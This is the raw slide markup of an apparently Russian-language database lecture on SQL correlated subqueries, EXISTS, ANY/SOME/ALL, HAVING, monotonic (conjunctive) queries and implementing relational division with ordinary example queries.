                <a:effectLst/>
              </a:rPr>
              <a:t>t1.f3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>t2.f3  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst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79F89-62E1-5C10-0EFA-1B3F86E3D079}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630101" y="4221088"/>
            <a:ext cx="8496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/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>для каждой строки таблицы tbl1 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>будет проверяться условие, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>что значение поля f2 этой строки совпадает со значением строки таблицы tbl2, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>где значение поля f3 равно значению поля f3 внешней таблицы ( tbl1 )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20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75B0F-ED19-1E0B-1F9A-C967DE67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Коррелированные подзапросы: пример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00E83A-BB03-4589-6129-D8FC4280B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79F89-62E1-5C10-0EFA-1B3F86E3D079}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075760" y="450912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/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>Использование данных внешней таблицы и «</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>алиасов</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>» (ссылок) для нескольких обращений к одной таблице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7AC8813-3254-4884-CE71-71EB3F5A7684}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1259632" y="2225053"/>
            <a:ext cx="6912768" cy="1961453"/>
            <a:chOff x="827584" y="1451454"/>
            <a:chExt cx="6912768" cy="19614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00B630-5840-B3DF-88EA-4B4108472C98}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="827584" y="1451454"/>
              <a:ext cx="4572000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 algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>SELECT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 *</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t> from 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tbl1 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="C00000"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t>t_out</a:t>
              </a:r>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr indent="0" algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>    WHERE 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f2</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ru-RU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 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&lt;</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr indent="0" algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>	(SELECT</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0070C0"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t> 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AVG(f2)</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr indent="0" algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>	FROM 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tbl1 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="7030A0"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t>t_in</a:t>
              </a:r>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr indent="0" algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>	WHERE</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0070C0"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="C00000"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t>t_out.f1</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>=</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent5"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="7030A0"/>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
                <a:t>t_in.f1</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="1800" dirty="0">
                  <a:effectLst/>
                </a:rPr>
                <a:t>);</a:t>
              </a:r>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr indent="0" algn="just">
                <a:spcAft>
                  <a:spcPts val="0"/>
                </a:spcAft>
              </a:pPr>
              <a:endPara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737BB4F0-F07E-B60F-09A0-C97B63F9CF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1880" y="1628800"/>
              <a:ext cx="2304256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C9D851F7-80EC-7D19-A16E-DC6BD4C62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1880" y="2166186"/>
              <a:ext cx="2304256" cy="3487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B69C6B-B8C8-9964-CF66-098C03EFCFD3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6174432" y="1935579"/>
              <a:ext cx="156592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>tbl1</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ru-RU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  <a:t/>
              </a:r>
              <a:br>
                <a:rPr lang="ru-RU" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1">
                      <a:lumMod val="50000"/>
                    </a:schemeClr>
                  </a:solidFill>
                  <a:effectLst/>
                </a:rPr>
              </a:br>
              <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1">
                    <a:lumMod val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="ru-RU" dirty="0"/>
                <a:t>два вхождения в запрос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53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75B0F-ED19-1E0B-1F9A-C967DE67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Коррелированные подзапросы: пример 3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00E83A-BB03-4589-6129-D8FC4280B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79F89-62E1-5C10-0EFA-1B3F86E3D079}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899592" y="515719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/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>во фразе HAVING можно использовать </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C42F1A"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>только</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> агрегирующие функции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0B630-5840-B3DF-88EA-4B4108472C98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1259632" y="2225053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SELECT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f1, COUNT(*), SUM(f2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0"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ru-RU" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>tbl1 t1</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/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    GROUP BY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f1</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="180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solidFill>
                  <a:srgbClr val="C42F1A"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>HAVING SUM(f2)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst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&gt;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endParaRPr lang="ru-RU" sz="180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	(SELECT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MIN(f2)*4 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="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          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>tbl1 t1_in</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/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                WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>t1.f1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</a:rPr>
              <a:t>t1_in.f1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="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          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst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Aft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pP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1E4A394-2734-6D85-D0A6-9AE91090AE23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3635896" y="2225053"/>
            <a:ext cx="1835696" cy="113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C21616-47C8-CA8D-B0F7-E0865484AE43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5464345" y="2040387"/>
            <a:ext cx="257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Агрегирующая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1282869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D5F33-055F-4D72-215F-2EE7A3F1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Квантор существования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033B61-C64F-241E-0909-E59B2B724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5F53A-1995-A5BC-095F-683633A010C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098870" y="249289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SELECT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f1,f2,f3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>tbl1</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/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    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>EXISTS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0"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ru-RU" dirty="0"/>
              <a:t>                 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>(SELECT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*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>tbl1 </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:effectLst/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>                  WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst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</a:rPr>
              <a:t>f4='10/11/2003'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst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043AD-480E-C1CA-5B1E-96C0464D51C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="648670" y="4485600"/>
            <a:ext cx="74888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Подзапрос может возвращать как множество строк, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>так и множество столбцов.</a:t>
            </a:r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При коррелированном подзапросе оператор EXISTS будет вычисляться каждый раз для каждой строки внешнего запроса</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marR="0" lvl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904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5A04D-B956-FAEB-A37E-9B3E3A4B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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>ANY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>SOME</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>ALL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3392DA-787A-70F5-3466-0531C0208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0F38FBB-AF15-910E-5523-4830CA2AE462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60637" y="1480915"/>
          <a:ext cx="8189119" cy="511272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09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784">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/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Стратегия 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Стратегия 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440">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/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</a:rPr>
                        <a:t>ALL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</a:rPr>
                        <a:t>ANY, SOME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83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SELECT id, name </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="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FROM goods </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="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WHERE id &gt; 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</a:rPr>
                        <a:t>ALL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endParaRPr lang="ru-RU" sz="1600" b="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	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SELECT id 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	  FROM goods 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	  WHERE availability</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="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SELECT id, name </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="16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FROM goods </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="16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WHERE id &gt;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</a:rPr>
                        <a:t>ANY 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	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SELECT id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	  FROM goods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	  WHERE availability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9503">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/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	id	name</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="0" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p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	4	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Наволочка</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="0" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p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	5	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Простынка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	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>id</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a: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ru-RU" sz="1600" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p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	2	Подушка</a:t>
                      </a:r>
                    </a:p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	3	Одеяло</a:t>
                      </a:r>
                    </a:p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	4	Наволочка</a:t>
                      </a:r>
                    </a:p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	5	Простынка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440">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/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accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Смысловой аналог: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="1600" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>AND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accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Смысловой аналог: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="1600" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>OR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60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91422-1EA1-866C-0489-1F24AE1E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Монотонные запросы - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Conjunctive Queries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F0649B-DF2F-B14A-7E2F-FC7EEFD99C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568" y="1484784"/>
                <a:ext cx="7848872" cy="1008112"/>
              </a:xfrm>
            </p:spPr>
            <p:txBody>
              <a:bodyPr anchor="t"/>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr lang="ru-RU" dirty="0"/>
                  <a:t>Запрос является </a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="ru-RU" i="1" dirty="0"/>
                  <a:t>монотонным</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="ru-RU" dirty="0"/>
                  <a:t> тогда и только тогда, когда для двух БД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верно, что запрос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)⊆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F0649B-DF2F-B14A-7E2F-FC7EEFD99C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1484784"/>
                <a:ext cx="7848872" cy="1008112"/>
              </a:xfrm>
              <a:blipFill>
                <a:blip r:embed="rId2"/>
                <a:stretch>
                  <a:fillRect l="-699" t="-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8D5FFB-A400-B902-8585-0C5301845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F1640A1-6595-9788-2C32-ECD3E4D0B23F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="5157192"/>
            <a:ext cx="7848872" cy="10081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Запросы к реляционной схеме, состоящей из комбинаций </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1" dirty="0"/>
              <a:t>выборки</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1" dirty="0"/>
              <a:t>проекции</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> и </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1" dirty="0"/>
              <a:t>соединения</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>, называется CQ-запросы (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" err="1"/>
              <a:t>Conjunctive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" err="1"/>
              <a:t>Queries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E460B1-0EEA-2DF5-3354-7413369E74F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55" y="2474394"/>
            <a:ext cx="7283079" cy="2178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4566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EE5A5-EF81-BA47-BE40-DEE819AD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монотонные запросы и реализация деления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39D8D4-8ADA-9563-22F9-70B50785A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42CD83C-BE4D-0E1D-FF26-135120A89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32" y="1530678"/>
            <a:ext cx="7553060" cy="78094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Немонотонными являются операции </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1" i="1" dirty="0"/>
              <a:t>вычитания и деления</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> и для их реализации часто используются вложенные подзапросы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D367E3B-23DC-4A3A-CEAB-EDBC1361B772}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3583601" y="2552607"/>
            <a:ext cx="4679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Выведите имена </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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всех работников</a:t>
            </a:r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которые работают </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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 каждым проектом</a:t>
            </a:r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30D661-74F0-C7AA-D737-3351F8A79617}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3459604" y="3750601"/>
            <a:ext cx="4586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Задача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не имеет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решения в классе CQ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Стрелка вниз 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8273D572-97A2-B90E-7887-BCE26CDAC8F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5590202" y="3293411"/>
            <a:ext cx="444500" cy="3186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2FCD1DF-B787-B027-F78B-1D2BA73691FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547332" y="4119933"/>
            <a:ext cx="7409044" cy="1370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Решение: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Если контрпримера к утверждению не существуют, то это утверждение всегда верно.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FFF5D5-E2DB-FDA2-711F-729E67A55FE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343" y="5998152"/>
            <a:ext cx="3389314" cy="57309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5346856-648E-DECA-F82D-ECAF02BEF654}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3275856" y="2311619"/>
            <a:ext cx="5400600" cy="190946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07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51B76-E272-4259-257A-A02DB90A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деления: через контрпример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B44040-8B31-19C6-2F22-14935CCC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DD77C0-8E83-7A18-7FCC-F6D2D23D36B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="881193" y="160723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вывести имена всех сотрудников, </a:t>
            </a:r>
            <a:b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для которых </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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не</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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существуют проекта</a:t>
            </a:r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b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над которым </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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они бы </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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не</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" b="1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работали</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C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9B551D-1C3D-50CC-9CEC-E2D881D4F4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24944"/>
            <a:ext cx="7257101" cy="341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3C92D7-21C2-F431-5E22-411C1BACCDF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82354"/>
            <a:ext cx="3389314" cy="57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9962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37999-5D7F-DF38-7ED4-5ECE01F5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реализации деления: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B50C93-8D52-40DC-D8E3-112E3981D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5" name="Рисунок 4" descr="Схема данных">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60AA3C73-58D2-2FA6-BD62-17B527B8327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42411"/>
            <a:ext cx="4488815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D8C1A31-3113-7EE9-25CE-5CBBCB3CF649}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5004049" y="1704860"/>
            <a:ext cx="2880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Определить производителей, которые выпускают модели </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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всех </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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типов </a:t>
